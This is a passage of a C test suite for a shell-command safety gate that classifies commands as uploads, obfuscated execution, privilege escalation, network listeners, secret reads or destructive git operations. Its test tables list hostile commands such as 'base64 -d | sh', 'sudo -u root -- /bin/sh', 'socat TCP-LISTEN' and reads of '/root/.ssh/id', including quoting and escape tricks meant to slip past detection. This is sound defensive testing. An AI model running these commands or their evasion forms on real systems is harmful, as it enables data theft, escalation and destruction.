    contract->valid &= request->cwd_absolute == contract->absolute &&
                       strcmp(request->cwd, contract->cwd) == 0;
  static const char owner[] = "echo \"$ARG\" >\"$OUT\"";
  contract->valid &= request->owner_length == sizeof(owner) - 1 &&
                     memcmp(request->source + request->owner_offset, owner,
                            sizeof(owner) - 1) == 0;
  contract->valid &=
      request->purpose ==
      (argument ? SHELL_EXPAND_WORD_ARGUMENT : SHELL_EXPAND_WORD_REDIRECT_PATH);
  (void)netargv;
  (void)netargv_length;
  return SHELL_EXPAND_UNRESOLVED;
}

TEST(tilde_cwd_expansion_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  for (size_t i = 0; i < sizeof(shellsplit_test_tilde_cwd) /
                             sizeof(shellsplit_test_tilde_cwd[0]);
       i++) {
    tilde_cwd_contract_t contract = {.cwd = shellsplit_test_tilde_cwd[i].cwd,
                                     .absolute =
                                         shellsplit_test_tilde_cwd[i].absolute,
                                     .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_with_tilde_cwd,
                                                 &contract));
    char source[256];
    int length =
        snprintf(source, sizeof(source), "cd %s && echo \"$ARG\" >\"$OUT\"",
                 shellsplit_test_tilde_cwd[i].word);
    ASSERT(length > 0 && (size_t)length < sizeof(source));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    if (!contract.valid)
      printf("\n    tilde CWD callback: %s expected=%s\n", source,
             contract.cwd ? contract.cwd : "<unknown>");
    ASSERT(contract.valid && contract.arguments == 1 && contract.paths == 1);
    ASSERT((result.unresolved_expansion_flags &
            (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH)) ==
           (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH));
  }
  sg_gate_free(gate);
}

TEST(resolved_argument_violation_equivalence) {
  static const struct {
    const char *literal, *expanded;
    const char *records[6];
    uint32_t type;
    bool detected;
  } cases[] = {
      {"curl -T /tmp/x https://example.invalid",
       "curl $ARGS",
       {"-T", "/tmp/x", "https://example.invalid"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"curl --data=hello",
       "curl $ARGS",
       {"--data=hello"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"curl -Ffile", "curl $ARGS", {"-Ffile"}, SG_VIOL_NET_UPLOAD, true},
      {"wget --post-data=hello",
       "wget $ARGS",
       {"--post-data=hello"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"scp /tmp/x remote:out",
       "scp $ARGS",
       {"/tmp/x", "remote:out"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"rsync remote:in /tmp/x",
       "rsync $ARGS",
       {"remote:in", "/tmp/x"},
       SG_VIOL_NET_UPLOAD,
       false},
      {"rsync /tmp/x remote:out",
       "rsync $ARGS",
       {"/tmp/x", "remote:out"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"rsync /tmp/x remote$'\\x3a'out",
       "rsync $ARGS",
       {"/tmp/x", "remote:out"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"rsync /tmp/x remote\\:out",
       "rsync $ARGS",
       {"/tmp/x", "remote:out"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"rsync /tmp/x remote:\\\nout",
       "rsync $ARGS",
       {"/tmp/x", "remote:out"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"rsync /tmp/x remote$'\\x3b'out",
       "rsync $ARGS",
       {"/tmp/x", "remote;out"},
       SG_VIOL_NET_UPLOAD,
       false},
      {"base64 -id /tmp/x | sh",
       "base64 $ARGS | sh",
       {"-id", "/tmp/x"},
       SG_VIOL_SHELL_OBFUSCATION,
       true},
      {"base64 -- --decode | sh",
       "base64 $ARGS | sh",
       {"--", "--decode"},
       SG_VIOL_SHELL_OBFUSCATION,
       false},
      {"base64 --decode | sh",
       "base64 $ARGS | sh",
       {"--decode"},
       SG_VIOL_SHELL_OBFUSCATION,
       true},
      {"openssl enc -d | sh",
       "openssl $ARGS | sh",
       {"enc", "-d"},
       SG_VIOL_SHELL_OBFUSCATION,
       true},
      {"openssl enc -- -d | sh",
       "openssl $ARGS | sh",
       {"enc", "--", "-d"},
       SG_VIOL_SHELL_OBFUSCATION,
       false},
      {"sudo -u root -- /bin/sh",
       "sudo $ARGS",
       {"-u", "root", "--", "/bin/sh"},
       SG_VIOL_SHELL_ESCALATION,
       true},
      {"sudo -u sh echo",
       "sudo $ARGS",
       {"-u", "sh", "echo"},
       SG_VIOL_SHELL_ESCALATION,
       false},
      {"sudo -u", "sudo $ARGS", {"-u"}, SG_VIOL_SHELL_ESCALATION, false},
      {"su --shell=/bin/sh",
       "su $ARGS",
       {"--shell=/bin/sh"},
       SG_VIOL_SHELL_ESCALATION,
       true},
      {"su -s/bin/sh",
       "su $ARGS",
       {"-s/bin/sh"},
       SG_VIOL_SHELL_ESCALATION,
       true},
      {"su -s /bin/sh",
       "su $ARGS",
       {"-s", "/bin/sh"},
       SG_VIOL_SHELL_ESCALATION,
       true},
      {"su -s -c", "su $ARGS", {"-s", "-c"}, SG_VIOL_SHELL_ESCALATION, false},
      {"su --command=echo",
       "su $ARGS",
       {"--command=echo"},
       SG_VIOL_SHELL_ESCALATION,
       true},
      {"chmod -R 755 /etc",
       "chmod $ARGS",
       {"-R", "755", "/etc"},
       SG_VIOL_PERM_SYSTEM,
       true},
      {"nc -l 8000", "nc $ARGS", {"-l", "8000"}, SG_VIOL_NET_LISTENER, true},
      {"socat TCP-LISTEN:8000 STDIO",
       "socat $ARGS",
       {"TCP-LISTEN:8000", "STDIO"},
       SG_VIOL_NET_LISTENER,
       true},
      {"socat TCP-LI\"ST\"EN:8000 STDIO",
       "socat $ARGS",
       {"TCP-LISTEN:8000", "STDIO"},
       SG_VIOL_NET_LISTENER,
       true},
      {"socat TCP-$'\\x4c'ISTEN:8000 STDIO",
       "socat $ARGS",
       {"TCP-LISTEN:8000", "STDIO"},
       SG_VIOL_NET_LISTENER,
       true},
      {"socat TCP-li\"st\"en:8000 STDIO",
       "socat $ARGS",
       {"TCP-listen:8000", "STDIO"},
       SG_VIOL_NET_LISTENER,
       true},
      {"socat TCP-LiStEn:8000 STDIO",
       "socat $ARGS",
       {"TCP-LiStEn:8000", "STDIO"},
       SG_VIOL_NET_LISTENER,
       false},
      {"socat TCP-LI$'\\x58'EN:8000 STDIO",
       "socat $ARGS",
       {"TCP-LIXEN:8000", "STDIO"},
       SG_VIOL_NET_LISTENER,
       false},
      {"git push --force",
       "git $ARGS",
       {"push", "--force"},
       SG_VIOL_GIT_DESTRUCTIVE,
       true},
      {"git clean -fdx",
       "git $ARGS",
       {"clean", "-fdx"},
       SG_VIOL_GIT_DESTRUCTIVE,
       true},
      {"git filter-branch",
       "git $ARGS",
       {"filter-branch"},
       SG_VIOL_GIT_DESTRUCTIVE,
       true},
      {"crontab -l", "crontab $ARGS", {"-l"}, SG_VIOL_PERSISTENCE, false},
      {"crontab -r", "crontab $ARGS", {"-r"}, SG_VIOL_PERSISTENCE, true},
      {"git push --force",
       "git $ARGS push --force",
       {NULL},
       SG_VIOL_GIT_DESTRUCTIVE,
       true},
      {"git '' push --force",
       "git $ARGS push --force",
       {""},
       SG_VIOL_GIT_DESTRUCTIVE,
       false},
      {"sudo '' sh", "sudo $ARGS sh", {""}, SG_VIOL_SHELL_ESCALATION, false},
      {"rsync remote:out",
       "rsync remote:out $ARGS",
       {NULL},
       SG_VIOL_NET_UPLOAD,
       true},
      {"rsync remote:out ''",
       "rsync remote:out $ARGS",
       {""},
       SG_VIOL_NET_UPLOAD,
       false},
      {"cloudflared", "cloudflared $ARGS", {NULL}, SG_VIOL_NET_LISTENER, false},
      {"command curl -T /tmp/x",
       "command curl $ARGS",
       {"-T", "/tmp/x"},
       SG_VIOL_NET_UPLOAD,
       true},
      {"exec base64 -d | sh",
       "exec base64 $ARGS | sh",
       {"-d"},
       SG_VIOL_SHELL_OBFUSCATION,
       true},
      {"base64 \"'-d'\" | sh",
       "base64 $ARGS | sh",
       {"'-d'"},
       SG_VIOL_SHELL_OBFUSCATION,
       false},
      {"base64 '\\-d' | sh",
       "base64 $ARGS | sh",
       {"\\-d"},
       SG_VIOL_SHELL_OBFUSCATION,
       false},
      {"su --shell='/bin/notsh'",
       "su $ARGS",
       {"--shell=/bin/notsh"},
       SG_VIOL_SHELL_ESCALATION,
       false},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
    sg_result_t literal = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].literal, &literal));
    ASSERT(literal.subcommand_count <= 2);
    char argv[2][512];
    size_t argv_lengths[2];
    uint32_t argument_flags[2];
    for (uint32_t j = 0; j < literal.subcommand_count; j++) {
      argv_lengths[j] = literal.subcommands[j].netargv_length;
      argument_flags[j] = literal.subcommands[j].violation_type_flags;
      ASSERT(argv_lengths[j] < sizeof(argv[j]));
      memcpy(argv[j], literal.subcommands[j].netargv, argv_lengths[j]);
    }
    char records[512];
    size_t used = 0;
    for (size_t j = 0; j < 6 && cases[i].records[j]; j++) {
      size_t written;
      ASSERT(shell_netstring_write(records + used, sizeof(records) - used - 1,
                                   cases[i].records[j],
                                   strlen(cases[i].records[j]),
                                   &written) == SHELL_NETSTRING_OK);
      used += written;
    }
    records[used] = 0;
    expansion_rule_t rule = {"$ARGS", SHELL_EXPAND_WORD_ARGUMENT,
                             SHELL_EXPAND_RESOLVED, records, 0};
    expansion_contract_t contract = {
        .rules = &rule, .rule_count = 1, .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    shellsplit_test_source_scan_reset();
    sg_result_t expanded = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].expanded, &expanded));
    if (literal.violation_type_flags != expanded.violation_type_flags)
      printf("\n    equivalence case %zu: %s => %u vs %u\n", i,
             cases[i].expanded, literal.violation_type_flags,
             expanded.violation_type_flags);
    ASSERT(contract.valid && contract.calls == 1 && rule.calls == 1);
    ASSERT(((expanded.violation_type_flags & cases[i].type) != 0) ==
           cases[i].detected);
    ASSERT(literal.violation_type_flags == expanded.violation_type_flags &&
           literal.violation_category_flags ==
               expanded.violation_category_flags &&
           literal.verdict == expanded.verdict &&
           literal.subcommand_count == expanded.subcommand_count);
    for (uint32_t j = 0; j < literal.subcommand_count; j++) {
      ASSERT(argv_lengths[j] == expanded.subcommands[j].netargv_length);
      ASSERT(memcmp(argv[j], expanded.subcommands[j].netargv,
                    argv_lengths[j]) == 0);
      ASSERT(argument_flags[j] == expanded.subcommands[j].violation_type_flags);
    }
    ASSERT(expanded.unresolved_expansion_flags == 0);
  }
  sg_gate_free(gate);
}

TEST(resolved_argument_binary_and_fallback_contract) {
  static const char binary[] = "9:-d\0suffix,";
  st_netargv_view_t bytes = {.data = binary, .length = sizeof(binary) - 1};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *plain, *truncated;
  } static_values[] = {
      {"base64 -d | sh", "base64 $'-d\\0suffix' | sh"},
      {"curl --data=x", "curl $'--data=x\\0ignored'"},
      {"curl --", "curl $'--\\0data=x'"},
      {"socat TCP-LISTEN:4444 STDIO",
       "socat $'TCP-LISTEN:4444\\0ignored' STDIO"},
      {"socat harmless STDIO", "socat $'harmless\\0LISTEN:4444' STDIO"},
      {"printf x >/tmp/.bashrc", "printf x >$'/tmp/.bashrc\\0ignored'"},
      {"printf x >/tmp/ordinary", "printf x >$'/tmp/ordinary\\0/.bashrc'"},
  };
  for (size_t i = 0; i < sizeof(static_values) / sizeof(static_values[0]);
       ++i) {
    sg_result_t plain = {0}, truncated = {0};
    ASSERT_SG_OK(eval_cmd(gate, static_values[i].plain, &plain));
    ASSERT_SG_OK(eval_cmd(gate, static_values[i].truncated, &truncated));
    ASSERT(plain.violation_type_flags == truncated.violation_type_flags &&
           plain.violation_category_flags ==
               truncated.violation_category_flags &&
           plain.verdict == truncated.verdict);
  }
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_requested_length, &bytes));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "base64 $ARGS | sh", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_SHELL_OBFUSCATION) == 0);
  ASSERT(result.subcommands[0].netargv_length == sizeof(binary) - 1 + 9);
  ASSERT(memcmp(result.subcommands[0].netargv + 9, binary,
                sizeof(binary) - 1) == 0);
  static const char remote[] = "11:remote\0:out,";
  bytes = (st_netargv_view_t){remote, sizeof(remote) - 1};
  ASSERT_SG_OK(eval_cmd(gate, "rsync /tmp/x $ARGS", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_NET_UPLOAD) != 0);
  static const char listen[] = "7:\0LISTEN,";
  bytes = (st_netargv_view_t){listen, sizeof(listen) - 1};
  ASSERT_SG_OK(eval_cmd(gate, "socat $ARGS STDIO", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) != 0);
  static const char split_listen[] = "7:LI\0STEN,";
  bytes = (st_netargv_view_t){split_listen, sizeof(split_listen) - 1};
  ASSERT_SG_OK(eval_cmd(gate, "socat $ARGS STDIO", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) == 0);
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_canonical_cstr, NULL));
  ASSERT_SG_OK(eval_cmd(gate, "curl --data=\"$VALUE\"", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_NET_UPLOAD) != 0 &&
         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
             0);
  ASSERT_SG_OK(eval_cmd(gate, "socat TCP-LI\"ST\"EN:$PORT STDIO", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) == 0 &&
         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV));
  ASSERT_SG_OK(eval_cmd(gate, "socat TCP-LISTEN:$PORT STDIO", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) != 0 &&
         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV));
  sg_gate_free(gate);
}

TEST(resolved_substitution_argument_file_relations) {
  static const char *words[] = {
      "\"$(printf file)\"",
      "\"pre$(printf file)post\"",
      "\"$(<\"$FILE\")\"",
      "<(printf file)",
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cat *", false));
  ASSERT_ST_OK(
      test_policy_replace_cpl(gate, false, "cat /root/.ssh/id /tmp/x", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "printf *", false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    expansion_rule_t rules[] = {
        {words[i], SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
         "13:/root/.ssh/id,6:/tmp/x,", 0},
        {"\"$FILE\"", SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH,
         SHELL_EXPAND_RESOLVED, "10:/tmp/input,", 0},
    };
    expansion_contract_t contract = {
        .rules = rules, .rule_count = 2, .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    char command[128];
    snprintf(command, sizeof(command), "cat %s", words[i]);
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT(contract.valid && rules[0].calls == 1);
    ASSERT_STR(result.subcommands[0].netargv,
               "3:cat,13:/root/.ssh/id,6:/tmp/x,");
    ASSERT((result.subcommands[0].violation_type_flags &
            SG_VIOL_READ_SECRETS) != 0);
    ASSERT(result.has_dynamic_substitution_io &&
           result.subcommands[0].has_dynamic_substitution_io);
    bool inspection = i != 3;
    ASSERT(result.requires_substitution_evaluation == inspection &&
           result.subcommands[0].requires_substitution_evaluation ==
               inspection);
    if (result.verdict !=
        (inspection ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW))
      printf("\n    substitution case %zu verdict=%d commands=%u\n", i,
             result.verdict, result.subcommand_count);
    ASSERT(result.verdict ==
           (inspection ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW));
    ASSERT(result.unresolved_expansion_flags == 0);
  }
  sg_gate_free(gate);
}

TEST(resolved_filename_substitution_consumer_contract) {
  static const struct {
    const char *source;
    unsigned owners;
    bool failed;
  } cases[] = {
      {"echo >\"$(cat /root/.ssh/id)\"", 1, false},
      {"echo <\"$(cat /root/.ssh/id)\"", 1, false},
      {"echo >\"$(cat /root/.ssh/id)\" >out", 1, false},
      {"{ echo one; { echo two; }; } >\"$(cat /root/.ssh/id)\"", 2, false},
      {"{ echo one; echo two; } <\"$(cat /root/.ssh/id)\"", 2, false},
      {"echo >\"$(cat /root/.ssh/id)\"", 0, true},
      {"true {fd}>\"$(cat /root/.ssh/id)\"", 0, true},
      {"exec {fd}<\"$(cat /root/.ssh/id)\"", 0, true},
      {"{ echo one; } {fd}>\"$(cat /root/.ssh/id)\"", 0, true},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    expansion_rule_t rule = {
        "\"$(cat /root/.ssh/id)\"", SHELL_EXPAND_WORD_REDIRECT_PATH,
        SHELL_EXPAND_RESOLVED, cases[i].failed ? "" : "8:/tmp/out,", 0};
    expansion_contract_t contract = {
        .rules = &rule, .rule_count = 1, .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(contract.valid && contract.calls == 1 && rule.calls == 1);
    unsigned owners = 0;
    for (uint32_t j = 0; j < result.subcommand_count; j++) {
      const sg_subcommand_result_t *command = &result.subcommands[j];
      ASSERT(!command->requires_substitution_evaluation);
      if (!command->has_dynamic_substitution_io)
        continue;
      owners++;
      ASSERT((command->violation_type_flags & SG_VIOL_SUBST_SENSITIVE) != 0);
    }
    ASSERT(owners == cases[i].owners && result.has_dynamic_substitution_io &&
           !result.requires_substitution_evaluation &&
           result.unresolved_expansion_flags == 0);
    if (cases[i].failed)
      ASSERT(result.subcommands[0].write_count == 0);
  }
  sg_gate_free(gate);
}

TEST(resolved_arguments_linear_work) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  char records[512];
  for (size_t count = 1; count <= 32; count *= 2) {
    for (size_t i = 0; i < count; i++)
      memcpy(records + 4 * i, "1:x,", 4);
    records[4 * count] = 0;
    expansion_rule_t rule = {"$ARGS", SHELL_EXPAND_WORD_ARGUMENT,
                             SHELL_EXPAND_RESOLVED, records, 0};
    expansion_contract_t contract = {
        .rules = &rule, .rule_count = 1, .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    shellsplit_test_source_scan_reset();
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, "base64 -d $ARGS | { sh; sh; }", &result));
    ASSERT(contract.valid && rule.calls == 1 && contract.calls == 1);
    ASSERT((result.violation_type_flags & SG_VIOL_SHELL_OBFUSCATION) != 0);
    ASSERT(shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_ARGUMENTS) ==
           count + 1);
  }
  sg_gate_free(gate);
}

TEST(expansion_operand_eligibility_contract) {
  expansion_rule_t rules[] = {
      {"\"$DATA\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED, "3:hit,",
       0},
      {"\"$ENVARG\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
       "3:hit,", 0},
      {"\"$WRAPPED\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
       "3:hit,", 0},
      {"\"$EXECARG\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
       "3:hit,", 0},
  };
  expansion_contract_t contract = {
      .rules = rules,
      .rule_count = sizeof(rules) / sizeof(rules[0]),
      .valid = true,
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
  static const char command[] =
      "\"$COMMAND\" \"$ARG\"; cd \"$DIR\"; printf '%s' \"$DATA\"; "
      "NAME=\"$VALUE\" echo \"$ENVARG\"; command echo \"$WRAPPED\"; "
      "exec echo \"$EXECARG\"";
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  if (!contract.valid || contract.calls != 4)
    printf("\n    eligibility callbacks: valid=%d calls=%zu "
           "rules=%zu/%zu/%zu/%zu "
           "unexpected=%.*s purpose=%d\n",
           contract.valid, contract.calls, rules[0].calls, rules[1].calls,
           rules[2].calls, rules[3].calls, (int)contract.unexpected_word_length,
           contract.unexpected_word ? contract.unexpected_word : "",
           contract.unexpected_purpose);
  ASSERT(contract.valid && contract.calls == 4);
  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
    ASSERT(rules[i].calls == 1);
  if (result.subcommand_count != 6) {
    printf("\n    eligibility result commands=%u\n", result.subcommand_count);
    for (uint32_t i = 0; i < result.subcommand_count; i++)
      printf("      %u: %s\n", i, result.subcommands[i].display_command);
  }
  ASSERT(result.subcommand_count == 6);
  ASSERT_STR(result.subcommands[1].netargv, "2:cd,4:$DIR,");
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,2:%s,3:hit,");
  ASSERT_STR(result.subcommands[3].netargv, "4:echo,3:hit,");
  ASSERT_STR(result.subcommands[4].netargv, "7:command,4:echo,3:hit,");
  ASSERT_STR(result.subcommands[5].netargv, "4:exec,4:echo,3:hit,");
  ASSERT((result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
         0);
  sg_gate_free(gate);
}

TEST(printf_expansion_control_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  expansion_rule_t rule = {"\"$V\"", SHELL_EXPAND_WORD_ARGUMENT,
                           SHELL_EXPAND_RESOLVED, "2:\\c,", 0};
  expansion_contract_t contract = {
      .rules = &rule, .rule_count = 1, .valid = true};
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
  for (size_t i = 0; i < sizeof(shellsplit_test_printf_expansion_cases) /
                             sizeof(shellsplit_test_printf_expansion_cases[0]);
       i++) {
    const char *source = shellsplit_test_printf_expansion_cases[i].source;
    size_t queries = shellsplit_test_printf_expansion_cases[i].queries;
    contract.calls = rule.calls = 0;
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    if (!contract.valid || contract.calls != queries)
      printf("\n    printf eligibility: %s queries=%zu expected=%zu\n", source,
             contract.calls, queries);
    ASSERT(contract.valid && contract.calls == queries &&
           rule.calls == queries && result.subcommand_count == 1);
    uint32_t flags = queries ? 0 : SG_EXPANSION_UNRESOLVED_ARGV;
    ASSERT(result.unresolved_expansion_flags == flags &&
           result.subcommands[0].unresolved_expansion_flags == flags);
  }
  /* Dynamic state control remains outside callback resolution. Do not publish
   * a resolution whose cached descriptor-mutation schedule cannot honor it. */
  contract.calls = rule.calls = 0;
  sg_result_t result = {0};
  ASSERT(eval_cmd(gate,
                  "exec {fd}>out; printf '%b%n' \"$V\" fd; echo >&\"$fd\"",
                  &result) == SG_ERR_PARSE);
  ASSERT(contract.valid && contract.calls == 0 && rule.calls == 0);
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT(eval_cmd(gate,
                  "exec {fd}>out; printf <() '%b%n' <() \"$V\" fd; "
                  "echo >&\"$fd\"",
                  &result) == SG_ERR_PARSE);
  ASSERT(contract.valid && contract.calls == 0 && rule.calls == 0);
  ASSERT_SG_OK(eval_cmd(
      gate, "exec {fd}>out; printf '%b%n' '\\c' fd; echo >&\"$fd\"", &result));
  ASSERT(result.subcommand_count == 3 &&
         result.subcommands[2].write_count == 1 && contract.calls == 0);
  sg_gate_free(gate);
}

TEST(substitution_blank_byte_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_control_byte_words) /
                             sizeof(shellsplit_test_control_byte_words[0]);
       i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_control_byte_words[i].source, &result));
    const char *expected = shellsplit_test_control_byte_words[i].netargv;
    ASSERT(result.subcommand_count == 1 &&
           result.subcommands[0].netargv_length == strlen(expected) &&
           !memcmp(result.subcommands[0].netargv, expected, strlen(expected)));
  }
  for (size_t i = 0; i < sizeof(shellsplit_test_nonblank_bodies) /
                             sizeof(shellsplit_test_nonblank_bodies[0]);
       i++) {
    sg_result_t retained = {0};
    ASSERT_SG_OK(eval_cmd(gate, shellsplit_test_nonblank_bodies[i], &retained));
    ASSERT(retained.subcommand_count == 1);
    static const char *const formats[] = {"value=$(%s) || printf fallback >out",
                                          "value=`%s` && printf reached >out",
                                          "cat <(%s) || printf fallback >out"};
    for (size_t f = 0; f < sizeof(formats) / sizeof(formats[0]); f++) {
      char source[128];
      snprintf(source, sizeof(source), formats[f],
               shellsplit_test_nonblank_bodies[i]);
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &result));
      ASSERT(result.subcommand_count == (f == 2 ? 3u : 2u));
      ASSERT(result.subcommands[result.subcommand_count - 1].write_count == 1);
    }
  }
  sg_gate_free(gate);
}

TEST(expansion_unresolved_flags_contract) {
  static const struct {
    const char *source;
    uint32_t flags;
  } cases[] = {
      {"echo \"$DATA\"", SG_EXPANSION_UNRESOLVED_ARGV},
      {"echo >\"$OUT\"", SG_EXPANSION_UNRESOLVED_PATH},
      {"echo \"$DATA\" >\"$OUT\"",
       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
      {"{ echo \"$DATA\"; } >\"$OUT\"",
       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(result.subcommand_count == 1 &&
           result.unresolved_expansion_flags == cases[i].flags &&
           result.subcommands[0].unresolved_expansion_flags == cases[i].flags);
  }
  /* Path uncertainty can belong to an unevaluated owner; aggregate flags
   * need not equal the OR of the retained early-stop result prefix. */
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo ok", false));
